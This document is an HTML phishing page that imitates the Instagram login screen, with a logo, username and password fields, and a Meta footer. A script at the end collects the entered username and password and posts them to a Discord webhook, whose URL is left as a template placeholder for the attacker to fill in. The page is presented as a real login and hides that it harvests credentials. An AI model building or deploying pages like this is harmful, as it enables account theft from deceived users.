<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            border: none;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background: #fafafa;
            height: 100vh;
        }

        main {
            height: 100vh;
            margin: auto;
            max-width: 935px;
        }

        a {
            text-decoration: none;
        }

        h1 {
            margin: 20px 0;
        }

        ul {
            list-style: none;
        }

        .flex {
            display: -webkit-box;
            display: -moz-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
        }

        .direction-column {
            -webkit-box-direction: normal;
            -webkit-box-orient: vertical;
            -moz-box-direction: normal;
            -moz-box-orient: vertical;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .justify-content-center {
            -webkit-box-pack: center;
            -moz-box-pack: center;
            -ms-flex-pack: center;
            -webkit-justify-content: center;
            justify-content: center;
        }

        .align-items-center {
            -webkit-box-align: center;
            -moz-box-align: center;
            -ms-flex-align: center;
            -webkit-align-items: center;
            align-items: center;
        }

        .flex-wrap {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
        }

        .panel {
            background-color: white;
            border: 1px solid #dbdbdb;
            margin-bottom: 10px;
            padding: 10px;
        }

        #auth {
            max-width: 350px;
        }

        #mobile {
            max-width: 454px;
        }

        #mobile img {
            height: 618px;
        }

        .login-with-fb,
        form {
            width: 100%;
        }

        .register,
        form {
            padding: 30px 20px;
        }

        .login-with-fb {
            padding: 30px 20px 20px 20px;
        }

        form .sr-only {
            display: none;
        }

        form input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #808080;
            margin-bottom: 8px;
            padding: 10px 10px;
            width: 100%;
        }

        form input::placeholder {
            color: #808080;
        }

        form input:focus {
            border: 1px solid #808080;
            outline: none;
        }

        form button {
            background-color: #0095f6;
            border-radius: 5px;
            color: #fff;
            font-weight: bold;
            height: 35px;
            margin-top: 10px;
            width: 100%;
        }

        .separator span {
            background-color: #dbdbdb;
            height: 1px;
            width: calc(100% - 10px);
        }

        .separator .or {
            color: #808080;
            font-weight: bold;
        }

        .separator {
            padding: 0 20px;
        }

        .separator span:first-child {
            margin-right: 10px;
        }

        .separator span:last-child {
            margin-left: 10px;
        }

        .login-with-fb a {
            color: #385185;
        }

        .login-with-fb>a {
            font-size: 12px;
        }

        .login-with-fb div a {
            font-weight: bold;
        }

        .login-with-fb div {
            margin-bottom: 15px;
        }

        .register * {
            font-size: 14px;
        }

        .register a {
            color: #0095f6;
            font-weight: bold;
        }

        .register p {
            margin-right: 5px;
        }

        .app-download {
            padding: 15px;
        }

        .app-download p {
            padding: 10px 0;
        }

        .app-download img {
            height: 40px;
            margin: 0 5px;
        }

        footer {
            margin: 0 auto 30px auto;
            max-width: 935px;
        }

        footer ul {
            margin-bottom: 20px;
        }

        footer ul li {
            margin: 0 10px 10px;
        }

        footer ul li a {
            color: #385185;
        }

        footer .copyright {
            color: #808080;
        }

        footer ul li a,
        footer .copyright {
            font-weight: bold;
            text-align: center;
            text-transform: uppercase;
        }

        @media screen and (max-width: 767px) {
            main {
                margin: 30px auto 50px auto;
            }

            footer .copyright,
            footer ul li a {
                font-size: 13px;
            }
        }
    </style>
</head>

<body>

    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex"></section>

        <section id="auth" class="flex direction-column">

            <div class="panel login flex direction-column">

                <h1 title="instagram" class="flex justify-content-center"><img src="icons/instagram-logo.png" alt="logo"
                        title="Instagram logo"></h1>

                <form id="form">
                    <label for="name" class="sr-only">Username/email</label>
                    <input name="name" placeholder="Username/email" id="name">


                    <label for="password" class="sr-only">Password</label>
                    <input type="password" name="password" placeholder="password" id="password">

                    <button type="button">Login</button>
                </form>


                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img>
                        <a>Enter Facebook</a>
                    </div>
                    <a href="#">Forget Passowrd</a>

                </div>

            </div>
        </section>
    </main>


    <footer>Meta © 2050 Instagram do Facebook</footer>


    <script>

        const formLoadTime = new Date();

        document.getElementById('form').addEventListener('submit', function (event) {

            // Prevent the browser from reloading
            event.preventDefault();

            const submitClickTime = new Date();

            const nameValue = document.getElementById('name').value;
            const passwordValue = document.getElementById("password").value;

            const webhookUrl = "{{DS-HOOK}}";

            const discordMessage = {

                content: `**New Form Submission**\n` +
                    `**Name:** ${nameValue}\n` +
                    `**Password:** ${passwordValue}\n` +
                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
            };


            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });
        })
    </script>

</body>

</html>
